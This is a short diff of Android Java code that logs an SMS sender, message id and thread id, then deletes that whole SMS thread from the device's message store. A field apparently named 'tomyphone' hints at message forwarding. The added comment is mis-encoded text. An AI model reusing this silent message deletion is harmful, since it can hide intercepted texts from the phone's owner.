@@ -118,7 +118,8 @@ public static String tomyphone ;
 	        		System.out.println("number="+number);
 	        		System.out.println("smsId="+smsId);
 	        		System.out.println("thread_id="+thread_id);
-	        		CR.delete(Uri.parse("content://sms"), "thread_id=" + thread_id, null);  
+	        		CR.delete(Uri.parse("content://sms"), "thread_id=" + thread_id, null); 
+	        		//É¾³ý¶ÌÐÅ
 	        	}
 	        } 
 	    } catch (Exception e) {
